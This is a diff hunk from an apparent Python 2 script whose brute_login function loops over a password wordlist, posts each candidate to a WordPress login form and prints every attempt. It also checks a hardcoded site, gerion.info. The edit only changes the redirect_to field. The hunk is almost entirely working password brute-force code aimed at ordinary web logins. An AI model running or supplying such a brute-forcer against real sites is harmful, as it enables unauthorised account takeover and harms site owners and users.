@@ -144,7 +144,7 @@ def brute_login(tgt, dictionary):
 	for word in f.readlines():
 		password = word.strip('\n')
 		intent+=1
-		payload = {'log': user, 'pwd': password, 'redirect_to': 'http://gerion.info/wp_admin/', 'testcookie': '1', 'wp-submit': 'Acceder'}
+		payload = {'log': user, 'pwd': password, 'redirect_to': '/wp_admin/', 'testcookie': '1', 'wp-submit': 'Acceder'}
 		print '[+] Trying with user: '+str(user)+' and password: '+str(password)+'\ttry: '+str(intent)
 		s.post(tgt, data=payload)
 		data = s.get("http://gerion.info/wp-admin").text
